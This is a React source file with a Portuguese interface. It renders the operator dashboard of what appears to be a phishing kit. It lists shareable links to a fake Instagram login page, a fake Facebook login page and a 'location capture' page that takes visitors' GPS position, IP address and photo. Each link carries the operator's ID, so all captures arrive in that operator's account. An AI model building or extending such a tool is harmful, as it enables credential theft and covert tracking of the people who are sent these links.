"use client"

import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Instagram, Facebook, MapPin, ExternalLink, Copy, CheckCircle2 } from "lucide-react"
import { useState, useEffect } from "react"
import { getCurrentUserId } from "@/lib/user-context"

const availableScreens = [
  {
    id: "location",
    name: "Captura de Localização",
    description: "Tela para capturar GPS, IP e foto do usuário",
    type: "location",
    icon: MapPin,
    color: "from-green-500 to-emerald-500",
    slug: "location",
  },
  {
    id: "instagram",
    name: "Instagram",
    description: "Tela de login do Instagram",
    type: "instagram",
    icon: Instagram,
    color: "from-purple-500 to-pink-500",
    slug: "instagram",
  },
  {
    id: "facebook",
    name: "Facebook",
    description: "Tela de login do Facebook",
    type: "facebook",
    icon: Facebook,
    color: "from-blue-600 to-blue-400",
    slug: "facebook",
  },
]

export default function PagesPage() {
  const [copiedId, setCopiedId] = useState<string | null>(null)
  const [userId, setUserId] = useState<string | null>(null)

  useEffect(() => {
    const uid = getCurrentUserId()
    setUserId(uid)
  }, [])

  const handleCopyLink = (slug: string, id: string) => {
    const url = `${window.location.origin}/screens/${slug}${userId ? `?uid=${userId}` : ""}`
    navigator.clipboard.writeText(url)
    setCopiedId(id)
    setTimeout(() => setCopiedId(null), 2000)
  }

  const handleOpenScreen = (slug: string) => {
    const url = `/screens/${slug}${userId ? `?uid=${userId}` : ""}`
    window.open(url, "_blank")
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="space-y-2">
        <h1 className="text-3xl font-bold text-foreground text-balance">Telas Disponíveis</h1>
        <p className="text-muted-foreground">
          Navegue pelas telas prontas do sistema. Copie os links e compartilhe conforme necessário.
        </p>
      </div>

      {/* Info card */}
      <Card className="glass-effect border-border/50 bg-primary/5 border-primary/20">
        <CardContent className="p-6">
          <div className="flex items-start gap-4">
            <div className="p-3 rounded-lg bg-primary/10">
              <CheckCircle2 className="h-6 w-6 text-primary" />
            </div>
            <div className="flex-1">
              <h3 className="font-semibold text-foreground mb-1">Como Usar</h3>
              <p className="text-sm text-muted-foreground">
                Estas são as telas prontas disponíveis no sistema. Você pode visualizar cada tela clicando no botão
                "Abrir" ou copiar o link para compartilhar.{" "}
                <strong>
                  Todas as capturas realizadas através destas telas aparecerão automaticamente na sua conta
                </strong>
                , isoladas de outros usuários. Os links já incluem seu identificador único.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Screens grid */}
      <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
        {availableScreens.map((screen) => (
          <Card key={screen.id} className="glass-effect border-border/50 hover:border-primary/30 transition-all group">
            <CardContent className="p-6">
              <div className="space-y-6">
                {/* Screen header with gradient icon */}
                <div className="flex items-start gap-4">
                  <div className={`p-4 rounded-xl bg-gradient-to-br ${screen.color} shadow-lg`}>
                    <screen.icon className="h-8 w-8 text-white" />
                  </div>
                  <div className="flex-1">
                    <h3 className="text-xl font-semibold text-foreground mb-1">{screen.name}</h3>
                    <p className="text-sm text-muted-foreground">{screen.description}</p>
                  </div>
                </div>

                {/* Screen info */}
                <div className="space-y-2 p-4 rounded-lg bg-muted/30 border border-border/30">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-medium text-muted-foreground">Link da Tela</span>
                    <span className="text-xs px-2 py-1 rounded-full bg-success/10 text-success border border-success/20">
                      Ativa
                    </span>
                  </div>
                  <p className="text-sm font-mono text-foreground break-all">/screens/{screen.slug}?uid=...</p>
                </div>

                {/* Action buttons */}
                <div className="flex gap-3">
                  <Button
                    onClick={() => handleOpenScreen(screen.slug)}
                    className="flex-1 btn-gradient-hover bg-primary hover:bg-primary/90 text-primary-foreground"
                  >
                    <ExternalLink className="h-4 w-4 mr-2" />
                    Abrir Tela
                  </Button>
                  <Button
                    onClick={() => handleCopyLink(screen.slug, screen.id)}
                    variant="outline"
                    className="border-border/50 hover:bg-accent"
                  >
                    {copiedId === screen.id ? (
                      <>
                        <CheckCircle2 className="h-4 w-4 mr-2 text-success" />
                        Copiado!
                      </>
                    ) : (
                      <>
                        <Copy className="h-4 w-4 mr-2" />
                        Copiar Link
                      </>
                    )}
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>
    </div>
  )
}
